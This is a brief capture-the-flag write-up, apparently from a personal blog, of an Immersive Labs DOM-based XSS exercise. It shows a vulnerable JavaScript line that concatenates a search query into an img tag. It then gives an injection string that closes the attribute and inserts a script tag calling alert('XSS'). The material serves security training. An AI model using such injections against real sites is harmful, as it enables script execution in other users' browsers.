---
date: 2025-01-15
categories: [CTF, ImmersiveLabs]
title: "IML - Cross-Site Scripting: Ep.4 – DOM-Based XSS"
tags: ['privilege escalation', 'rce', 'xss']

description: "Cross-Site Scripting Ep.4 – D - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# IML - Cross-Site Scripting: Ep.4 – DOM-Based XSS


![image1](../resources/67d569a52546432e9ab3078c02172071.png)

![image2](../resources/5ab24e8e01f04e53aafdcb9682f2fef3.png)

**<u>Original query:</u>**
```bash
var tracker = '<div hidden><img src="/resources/search_assets/search.gif?query=' + query + '"></div>'

```
**<u>Inject the following:</u>**
```bash
'"\>\<script\>alert('XSS')\</script\>\<"'

```
**<u>Malicious query:</u>**
```bash
var tracker = '<div hidden><img src="/resources/search_assets/search.gif?query=' + '"><script>alert('XSS')</script><"' + '"></div>'

```
Paste entire malicious code above into Search box

![image3](../resources/d391ec42b4634412a55705b92b912c33.png)


![image4](../resources/709124b3a54f47a28161d72ce125a907.png)
